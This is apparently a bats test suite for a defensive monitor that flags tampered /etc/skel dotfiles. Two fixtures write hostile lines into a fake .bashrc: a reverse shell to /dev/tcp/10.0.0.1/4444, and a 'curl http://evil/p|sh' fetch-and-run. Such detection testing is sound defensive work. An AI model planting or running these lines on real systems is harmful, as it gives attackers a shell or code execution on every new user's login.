#!/usr/bin/env bats
# L2 bats functional tests for the skel-watchdog scan script.
#
# /etc/skel is copied into every NEW user's home at account creation, so a
# planted dotfile (.bashrc, .profile, …) becomes the login-shell rc of every
# future user — delayed, per-new-user code execution (T1546.004 family). A
# skel file that is world-writable / non-root-owned, or contains a
# command-injection pattern, is alert. The scan recurses (find -type f), so
# hidden dotfiles are covered.
#
# Run with: bats packaging/test/L2-skel-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd/skel-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    SKELD="${TMP}/skel"; mkdir -p "${SKELD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SKEL_PROFILE="${PROFILE:-report}" \
    SELFDEF_SKEL_BASELINE="${BASELINE}" \
    SELFDEF_SKEL_DIRS="${DIRS_V:-$SKELD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# .bashrc\nexport PATH="$PATH:/usr/local/bin"\n' > "${SKELD}/.bashrc"
}

@test "no skel dir → ok / no_skel" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_skel"'
    cap | grep -q '"severity":"ok"'
}

@test "benign skel dotfile, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged skel on second run → ok / skel_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"skel_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a skel dotfile with an injection pattern → alert / skel_suspicious" {
    seed_benign
    run_wd
    printf '# .bashrc\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"skel_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable skel dotfile → alert" {
    seed_benign
    run_wd
    chmod 0666 "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign skel change → warn / skel_changed" {
    seed_benign
    run_wd
    printf '# .bashrc\nexport PATH="$PATH:/usr/local/sbin"\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"skel_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned skel dotfile is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious skel dotfile" {
    seed_benign
    run_wd
    printf '# .bashrc\ncurl http://evil/p|sh\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
